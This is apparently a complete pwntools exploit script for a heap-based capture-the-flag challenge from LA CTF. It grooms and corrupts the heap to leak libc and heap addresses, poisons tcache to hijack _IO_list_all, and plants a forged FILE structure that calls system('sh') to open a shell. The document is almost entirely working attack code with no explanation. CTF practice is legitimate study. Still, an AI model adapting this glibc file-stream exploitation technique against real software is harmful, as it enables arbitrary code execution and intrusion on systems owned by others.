#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './chall_patched')
libc = ELF(exe.libc.path) if exe.libc else None

def make(idx, size, data=b'A'*8):
  io.sendlineafter(b'> ', b'1')
  io.sendlineafter(b': ', str(idx).encode())
  io.sendlineafter(b': ', str(size).encode())
  io.sendafter(b': ', data)

def free(idx):
  io.sendlineafter(b'> ', b'2')
  io.sendlineafter(b': ', str(idx).encode())

def view(idx):
  io.sendlineafter(b'> ', b'3')
  io.sendlineafter(b': ', str(idx).encode())

gdbscript = '''
init-pwndbg
c
'''.format(**locals())

# io = remote('chall.lac.tf', 31144)

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
io = gdb.debug(exe.path, gdbscript=gdbscript)

make(0, 0)
make(1, 0x18)

free(1)
free(0)

for i in range(0x20, 0xa0, 0x10): make(0, i) ; make(1, i) ; free(0) ; free(1)


make(0, 0)
make(1, 0x18)

free(0)
make(0, 0, b'A'*0x18 + p64(0x560|1))

free(1)
free(0)
make(0, 0, b'A'*0x20)
view(0)
io.recvuntil(b'A'*0x20)
libc.address = u64(io.recvline()[:-1].ljust(8, b'\x00')) - 0x21ace0

free(0)
make(0, 0, b'A'*0x40)
view(0)
io.recvuntil(b'A'*0x40)
heap_base = u64(io.recvline()[:-1].ljust(8, b'\x00')) << 12

free(0)
make(0, 0, b'A'*0x18 + p64(0x560|1) + b'A'*0x18 + p64(0x30|1) + b'A'*0x28 + p64(0x30|1) + p64(libc.sym._IO_list_all^(heap_base>>12)))
free(0)

make(0, 0x20)
make(1, 0x20, p64(heap_base+0x2a0))
free(0)

fs = flat(
    {
        0x00: b"aa;sh\x00",
        0x08: p64(0),
        0x20: p64(0),
        0x28: p64(1),
        0x68: libc.symbols["system"],
        0x88: libc.symbols["_IO_stdfile_0_lock"],
        0xA0: heap_base+0x2a0 - 0x10,
        0xC0: p64(0),
        0xD0: heap_base+0x2a0,
        0xD8: libc.symbols["_IO_wfile_jumps"],
    },
    filler=b'\x00'
)

make(0, 0, fs)

io.sendlineafter(b'> ', b'4')
io.interactive()
